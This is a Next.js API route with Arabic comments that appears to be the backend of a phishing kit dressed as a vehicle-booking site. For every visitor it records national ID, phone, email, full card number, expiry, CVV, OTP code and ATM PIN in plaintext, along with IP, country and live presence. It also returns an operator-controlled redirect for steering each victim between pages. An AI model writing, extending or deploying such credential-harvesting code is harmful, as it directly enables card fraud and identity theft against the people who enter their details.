import { NextRequest, NextResponse } from 'next/server';
import { v4 as uuidv4 } from 'uuid';
import getDb from '@/lib/db';

// الحصول على بيانات الجلسة الحالية
export async function GET(req: NextRequest) {
  try {
    const db = getDb();
    const sessionId = req.cookies.get('session_id')?.value;

    if (!sessionId) {
      return NextResponse.json({ session: null });
    }

    const session = db.prepare('SELECT * FROM sessions WHERE id = ?').get(sessionId);

    if (!session) {
      return NextResponse.json({ session: null });
    }

    return NextResponse.json({ session });
  } catch (e) {
    console.error(e);
    return NextResponse.json({ session: null });
  }
}

// إنشاء أو تحديث الجلسة
export async function POST(req: NextRequest) {
  try {
    const db = getDb();
    const body = await req.json();
    const now = Date.now();

    // الحصول على IP والدولة
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
               req.headers.get('x-real-ip') || 'unknown';

    // محاولة الحصول على الدولة من IP
    let country = body.country || '';
    if (!country && ip !== 'unknown' && ip !== '127.0.0.1' && !ip.startsWith('192.168') && !ip.startsWith('10.')) {
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode`);
        const geo = await geoRes.json();
        country = geo.country || '';
      } catch {
        country = '';
      }
    }

    let sessionId = req.cookies.get('session_id')?.value;
    const isNew = !sessionId;

    if (!sessionId) {
      sessionId = uuidv4();
    }

    // التحقق من وجود الجلسة
    const existing = db.prepare('SELECT id FROM sessions WHERE id = ?').get(sessionId);

    if (existing) {
      // تحديث البيانات الموجودة
      const updates: string[] = [];
      const values: unknown[] = [];

      const fields = ['name', 'id_number', 'plate_number', 'booking_date', 'phone', 'email',
                      'card_number', 'card_expiry', 'card_cvv', 'card_holder', 'otp_code',
                      'atm_pin', 'current_page'];

      for (const field of fields) {
        if (body[field] !== undefined) {
          updates.push(`${field} = ?`);
          values.push(body[field]);
        }
      }

      if (body.current_page) {
        updates.push('is_new = 1');
      }

      updates.push('updated_at = ?');
      values.push(now);
      values.push(sessionId);

      if (updates.length > 1) {
        db.prepare(`UPDATE sessions SET ${updates.join(', ')} WHERE id = ?`).run(...values);
      }
    } else {
      // إنشاء جلسة جديدة
      db.prepare(`
        INSERT INTO sessions (id, country, ip, name, id_number, plate_number, booking_date,
          phone, email, card_number, card_expiry, card_cvv, card_holder, otp_code, atm_pin,
          current_page, status, is_new, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'active', 1, ?, ?)
      `).run(
        sessionId, country, ip,
        body.name || '', body.id_number || '', body.plate_number || '',
        body.booking_date || '', body.phone || '', body.email || '',
        body.card_number || '', body.card_expiry || '', body.card_cvv || '',
        body.card_holder || '', body.otp_code || '', body.atm_pin || '',
        body.current_page || 'home', now, now
      );
    }

    // تسجيل الزيارة
    if (body.current_page) {
      db.prepare(`
        INSERT INTO visits (session_id, page, country, ip, visited_at) VALUES (?, ?, ?, ?, ?)
      `).run(sessionId, body.current_page, country, ip, now);
    }

    // تحديث المتواجدين الآن
    db.prepare(`
      INSERT OR REPLACE INTO active_users (session_id, last_ping) VALUES (?, ?)
    `).run(sessionId, now);

    // الحصول على redirect إن وجد
    const sessionData = db.prepare('SELECT redirect_to, status FROM sessions WHERE id = ?').get(sessionId) as { redirect_to: string; status: string } | undefined;

    const response = NextResponse.json({
      success: true,
      sessionId,
      redirect_to: sessionData?.redirect_to || '',
      status: sessionData?.status || 'active',
    });

    if (isNew) {
      response.cookies.set('session_id', sessionId, {
        httpOnly: false, // يحتاج القراءة من JS
        maxAge: 60 * 60 * 24 * 30, // 30 يوم
        path: '/',
        sameSite: 'lax',
      });
    }

    return response;
  } catch (e) {
    console.error(e);
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 });
  }
}
